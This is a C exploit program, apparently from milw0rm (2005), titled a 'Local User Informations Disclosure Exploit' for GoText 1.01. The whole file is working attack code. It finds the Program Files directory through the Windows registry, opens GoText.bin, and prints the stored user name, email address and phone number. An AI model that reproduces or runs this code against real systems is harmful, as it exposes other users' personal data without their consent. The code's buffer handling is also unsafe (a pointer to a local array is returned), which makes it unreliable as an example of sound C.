/*******************************************************************

GoText 1.01 Local User Informations Disclosure Exploit by Kozan

Application: GoText 1.01
Vendor: StumbleInside Software - www.stumbleinside.com
Vulnerable Description: GoText 1.01 discloses user informations
to local users.


Discovered & Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*******************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


int adresal(char *FilePath,char *Str)
{
char kr;
int Sayac=0;
int Offset=-1;
FILE *di;
di=fopen(FilePath,"rb");

if( di == NULL )
{
fclose(di);
return -1;
}

while(!feof(di))
{
Sayac++;
for(int i=0;i<strlen(Str);i++)
{
kr=getc(di);
if(kr != Str[i])
{
if( i>0 )
{
fseek(di,Sayac+1,SEEK_SET);
}
break;
}
if( i > ( strlen(Str)-2 ) )
{
Offset = ftell(di)-strlen(Str);
fclose(di);
return Offset;
}
}
}
fclose(di);
return -1;
}


char *oku(char *FilePath,char *Str)
{

FILE *di;
char cr;
int i=0;
char Feature[500];

int Offset = adresal(FilePath,Str);

if( Offset == -1 )
return "";

if( (di=fopen(FilePath,"rb")) == NULL )
return "";

fseek(di,Offset+strlen(Str),SEEK_SET);

while(!feof(di))
{
cr=getc(di);
if(cr == 0x0D)
break;
Feature[i] = cr;
i++;
}

Feature[i] = '\0';
fclose(di);
return Feature;
}


int main()
{
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",0,KEY_QUERY_VALUE,&hKey)
== ERROR_SUCCESS)
	{

		lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,(LPBYTE) prgfiles,
&dwBufLen);

		if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
		{
			RegCloseKey(hKey);
			printf("An error occured!\n");
			exit(1);
		}

		RegCloseKey(hKey);

	}
	else
	{
		RegCloseKey(hKey);
		printf("An error occured!\n");
		exit(1);
	}

	strcat(prgfiles,"\\GoText\\GoText.bin");

	printf("GoText 1.01 Local User Informations Disclosure Exploit by Kozan\n");
	printf("Credits to ATmaCA\n");
	printf("www.netmagister.com - www.spyinstructors.com \n");
	printf("kozan@netmagister.com \n\n");

	char UserName[BUFSIZE], MailAddress[BUFSIZE], PhoneNumber[BUFSIZE];

	strcpy(UserName,oku(prgfiles,"MyName="));
	strcpy(MailAddress,oku(prgfiles,"MyEmail="));
	strcpy(PhoneNumber,oku(prgfiles,"MyNumber="));

	printf("User Name    : %s\n",UserName);
	printf("Mail Address : %s\n",MailAddress);
	printf("Phone Number : %s\n",PhoneNumber);

	return 0;
}

// milw0rm.com [2005-04-28]
